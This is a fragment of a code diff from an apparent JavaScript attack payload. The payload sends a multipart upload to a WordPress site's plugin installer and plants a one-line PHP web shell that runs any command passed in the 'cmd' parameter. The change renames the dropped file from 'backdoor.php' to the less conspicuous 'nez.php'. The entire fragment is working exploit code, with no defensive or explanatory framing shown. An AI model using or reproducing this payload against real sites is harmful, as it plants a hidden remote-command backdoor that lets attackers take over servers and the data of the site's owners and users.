@@ -22,7 +22,7 @@ ajax.onreadystatechange = function(){
       "\r\n" +
       "/wp-admin/plugin-install.php\r\n" +
       "-----------------------------106557699112863554041057400679\r\n" +
-      "Content-Disposition: form-data; name=\"pluginzip\"; filename=\"backdoor.php\"\r\n" +
+      "Content-Disposition: form-data; name=\"pluginzip\"; filename=\"nez.php\"\r\n" +
       "Content-Type: text/php\r\n" +
       "\r\n" +
       "\x3c?php echo system($_GET[\'cmd\']); ?\x3e\r\n" +
